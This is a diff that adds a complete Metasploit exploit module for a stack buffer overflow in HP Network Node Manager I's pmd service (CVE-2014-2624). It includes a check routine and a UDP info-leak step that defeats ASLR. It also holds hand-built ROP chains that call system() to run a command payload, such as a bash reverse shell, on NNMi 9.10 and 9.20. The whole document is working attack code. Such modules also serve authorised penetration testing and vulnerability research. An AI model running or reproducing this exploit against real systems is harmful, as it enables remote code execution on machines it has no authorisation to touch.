@@ -1,0 +1,229 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Udp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'HP Network Node Manager I PMD Buffer Overflow',
+      'Description'    => %q{
+        This module exploits a stack buffer overflow in HP Network Node Manager I (NNMi). The
+        vulnerability exists in the pmd service, due to the insecure usage of functions like
+        strcpy and strcat while handling stack_option packets with user controlled data. In
+        order to bypass ASLR this module uses a proto_tbl packet to leak an libov pointer from
+        the stack and finally build the rop chain to avoid NX.
+      },
+      'Author'         =>
+        [
+          'd(-_-)b',     # Vulnerability discovery
+          'juan vazquez' # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2014-2624'],
+          ['ZDI', '14-305']
+        ],
+      'Payload'        =>
+        {
+          'BadChars'    => "\x00",
+          'Space'       => 3000,
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd cmd_bash',
+              'RequiredCmd' => 'generic python perl openssl bash-tcp gawk'
+            }
+        },
+      'Arch'           => ARCH_CMD,
+      'Platform'       => 'unix',
+      'Targets'        =>
+        [
+          ['Automatic', {}],
+          ['HP NNMi 9.10 / CentOS 5',
+            {
+              # ptr to .rodata with format specifier
+              #.rodata:0003BE86 aS_1            db '%s',0
+              'ov_offset'      => 0x3BE86,
+              :rop             => :rop_hp_nnmi_9_10
+            }
+          ],
+          ['HP NNMi 9.20 / CentOS 6',
+            {
+              # ptr to .rodata with format specifier
+              #.rodata:0003C2D6 aS_1            db '%s',0
+              'ov_offset'      => 0x3c2d8,
+              :rop             => :rop_hp_nnmi_9_20
+            }
+          ]
+        ],
+      'Privileged'     => false, # true for HP NNMi 9.10, false for HP NNMi 9.20
+      'DisclosureDate' => 'Sep 09 2014',
+      'DefaultTarget'  => 0
+      ))
+
+    register_options([ Opt::RPORT(7426) ], self.class)
+  end
+
+  def check
+    header = [
+      0x2a5,  # pmdmgr_init pkt
+      0x3cc,  # signature
+      0xa0c,  # signature
+      0xca8   # signature
+    ].pack("V")
+
+    data = "\x00" * (0xfa4 - header.length)
+
+    pkt = header + data
+
+    connect_udp
+    udp_sock.put(pkt)
+    res = udp_sock.timed_read(8, 1)
+    if res.blank?
+      # To mitigate MacOSX udp sockets behavior
+      # see https://dev.metasploit.com/redmine/issues/7480
+      udp_sock.put(pkt)
+      res = udp_sock.timed_read(8)
+    end
+    disconnect_udp
+
+    if res.blank?
+      return Exploit::CheckCode::Unknown
+    elsif res.length == 8 && res.unpack("V").first == 0x2a5
+      return Exploit::CheckCode::Detected
+    else
+      return Exploit::CheckCode::Unknown
+    end
+  end
+
+  def exploit
+    connect_udp
+    # info leak with a "proto_tbl" packet
+    print_status("Sending a 'proto_tbl' request...")
+    udp_sock.put(proto_tbl_pkt)
+
+    res = udp_sock.timed_read(13964, 1)
+    if res.blank?
+      # To mitigate MacOSX udp sockets behavior
+      # see https://dev.metasploit.com/redmine/issues/7480
+      udp_sock.put(proto_tbl_pkt)
+      res = udp_sock.timed_read(13964)
+    end
+
+    if res.blank?
+      fail_with(Failure::Unknown, "Unable to get a 'proto_tbl' response...")
+    end
+
+    if target.name == 'Automatic'
+      print_status("Fingerprinting target...")
+      my_target = auto_target(res)
+      fail_with(Failure::NoTarget, "Unable to autodetect target...") if my_target.nil?
+    else
+      my_target = target
+      fail_with(Failure::Unknown, "Unable to leak libov base address...") unless find_ov_base(my_target, res)
+    end
+
+    print_good("Exploiting #{my_target.name} with libov base address at 0x#{@ov_base.to_s(16)}...")
+
+    # exploit with a "stack_option_pkt" packet
+    udp_sock.put(stack_option_pkt(my_target, @ov_base))
+
+    disconnect_udp
+  end
+
+  def rop_hp_nnmi_9_10(ov_base)
+    rop = rand_text_alpha(775)
+    rop << [0x808d7c1].pack("V")          # pop ebx ; pop ebp ; ret
+    rop << [ov_base + 0x481A8].pack("V")  # ebx: libov .got
+    rop << [0x8096540].pack("V")          # ptr to .data where user controlled string will be stored:
+                                          # "PMD Stack option specified, but stack not available (user_controlled)"
+    rop << [0x808d7c2].pack("V")          # pop ebp # ret
+    rop << [0x08096540 + 4732].pack("V")  # ebp: ptr to our controlled data in .data (+0x1028 to compensate)
+    rop << [ov_base +  0x1D692].pack("V") # ptr to 'call _system' sequence:
+                                          #.text:0001D692  lea     eax, [ebp+dest]
+                                          #.text:0001D698  push    eax             ; command
+                                          #.text:0001D699  call    _system
+    rop
+  end
+
+  def rop_hp_nnmi_9_20(ov_base)
+    rop = rand_text_alpha(775)
+    rop << [0x808dd70].pack("V")                      # pop eax ; pop ebx ; pop ebp ; ret
+    rop << [0xf7f61cd0 + ov_base + 0x1dae6].pack("V") # eax: ptr to 'call _system' sequence
+                                                      #.text:0001DAE6  lea     eax, [ebp+dest] (dest = -0x1028)
+                                                      #.text:0001DAEC  push    eax             ; command
+                                                      #.text:0001DAED  call    _system
+    rop << [0x08097160].pack("V")                     # ebx: ptr to .data where user controlled string will be stored:
+                                                      # "PMD Stack option specified, but stack not available (user_controlled)"
+    rop << rand_text_alpha(4)                         # ebp: padding
+    rop << [0x804fb86].pack("V")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)
+    rop << [0x8049ac4].pack("V")                      # xchg eax, edi ; ret
+    rop << [0x808dd70].pack("V")                      # pop eax ; pop ebx ; pop ebp ; ret
+    rop << [0xf7f61cd0 + ov_base + 0x47f1c].pack("V") # eax: libov .got base
+    rop << rand_text_alpha(4)                         # ebx: padding
+    rop << [0x8097160 + 4764].pack("V")               # ebp: ptr to our controlled data in .data (+0x1028 to compensate)
+    rop << [0x804fb86].pack("V")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)
+    rop << [0x805a58d].pack("V")                      # xchg ebx eax ; and eax 0xc4830001 ; and cl cl ; ret (ebx: libov .got)
+    rop << [0x8049ac4].pack("V")                      # xchg eax, edi ; ret ; (eax: call to system sequence from libov)
+    rop << [0x80528BC].pack("V")                      # jmp eax
+
+    rop
+  end
+
+  def stack_option_pkt(t, ov_base)
+    hdr = [0x2a9].pack("V")             # stack_option packet
+    data = "-SA"                        # stack name (invalid one 'A')
+    data << ";"                         # separator
+    data << self.send(t[:rop], ov_base) # malformed stack options
+    data << payload.encoded
+    data << ";\n"
+    data << "\x00" * (0xfa4 - data.length - hdr.length)
+
+    hdr + data
+  end
+
+  def proto_tbl_pkt
+    hdr = [0x2aa].pack("V") # proto_tbl packet
+    data = "\x00" * (0xfa4 - hdr.length)
+
+    hdr + data
+  end
+
+  def base(address, offset)
+    address - offset
+  end
+
+  def find_ov_base(t, data)
+    print_status("Searching #{t.name} pointers...")
+    i = 0
+    data.unpack("V*").each do |int|
+      if base(int, t['ov_offset']) % 0x1000 == 0
+        print_status("Pointer 0x#{int.to_s(16)} found at offset #{i * 4}")
+        @ov_base = base(int, t['ov_offset'])
+        return true
+      end
+      i = i + 1
+    end
+
+    false
+  end
+
+  def auto_target(data)
+    targets.each do |t|
+      next if t.name == 'Automatic'
+      if find_ov_base(t, data)
+        return t
+      end
+    end
+
+    nil
+  end
+
+end
